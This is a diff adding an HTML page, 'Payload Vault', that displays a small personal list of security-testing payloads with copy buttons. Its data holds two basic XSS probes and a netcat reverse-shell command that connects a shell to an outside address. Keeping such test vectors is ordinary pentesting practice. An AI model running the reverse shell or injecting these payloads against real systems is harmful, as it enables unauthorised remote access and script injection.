@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payload Repository</title>
+    <style>
+        :root {
+            --bg: #0f172a;
+            --card-bg: #1e293b;
+            --text: #f1f5f9;
+            --accent: #38bdf8;
+            --code-bg: #000000;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
+            margin: 0;
+            padding: 2rem;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+        }
+
+        header {
+            border-bottom: 2px solid var(--accent);
+            padding-bottom: 1rem;
+            margin-bottom: 2rem;
+        }
+
+        h1 { margin: 0; color: var(--accent); }
+
+        .payload-card {
+            background: var(--card-bg);
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin-bottom: 1.5rem;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+        }
+
+        .category {
+            display: inline-block;
+            background: var(--accent);
+            color: var(--bg);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            margin-bottom: 0.5rem;
+        }
+
+        .description {
+            display: block;
+            margin-bottom: 1rem;
+            font-style: italic;
+            color: #94a3b8;
+        }
+
+        pre {
+            background: var(--code-bg);
+            padding: 1rem;
+            border-radius: 4px;
+            overflow-x: auto;
+            border: 1px solid #334155;
+            position: relative;
+        }
+
+        code {
+            font-family: 'Courier New', Courier, monospace;
+            color: #ec4899; /* Pinkish color for payloads */
+        }
+
+        .copy-btn {
+            background: #334155;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.7rem;
+            float: right;
+        }
+
+        .copy-btn:hover { background: var(--accent); color: var(--bg); }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <header>
+        <h1>Payload Vault</h1>
+        <p>A personal repository for security testing vectors.</p>
+    </header>
+
+    <div id="payload-list">
+        </div>
+</div>
+
+<script>
+    // --- ADD YOUR PAYLOADS HERE ---
+    const myPayloads = [
+        {
+            category: "XSS",
+            description: "Basic alert bypass",
+            code: "<script>alert(1)<\/script>"
+        },
+        {
+            category: "RCE",
+            description: "Netcat reverse shell",
+            code: "nc -e /bin/sh 10.0.0.1 1234"
+        },
+        {
+            category: "XSS",
+            description: "SVG onload vector",
+            code: "<svg onload=alert(1)>"
+        }
+    ];
+
+    const container = document.getElementById('payload-list');
+
+    // Function to safely encode HTML
+    function escapeHTML(str) {
+        return str.replace(/[&<>"']/g, function(m) {
+            return {
+                '&': '&amp;',
+                '<': '&lt;',
+                '>': '&gt;',
+                '"': '&quot;',
+                "'": '&#39;'
+            }[m];
+        });
+    }
+
+    // Render payloads
+    myPayloads.forEach((item, index) => {
+        const card = document.createElement('div');
+        card.className = 'payload-card';
+        card.innerHTML = `
+            <span class="category">${item.category}</span>
+            <span class="description">${item.description}</span>
+            <pre><button class="copy-btn" onclick="copyCode('code-${index}')">Copy</button><code id="code-${index}">${escapeHTML(item.code)}</code></pre>
+        `;
+        container.appendChild(card);
+    });
+
+    function copyCode(id) {
+        const text = document.getElementById(id).innerText;
+        navigator.clipboard.writeText(text);
+        alert("Payload copied to clipboard!");
+    }
+</script>
+
+</body>
+</html>
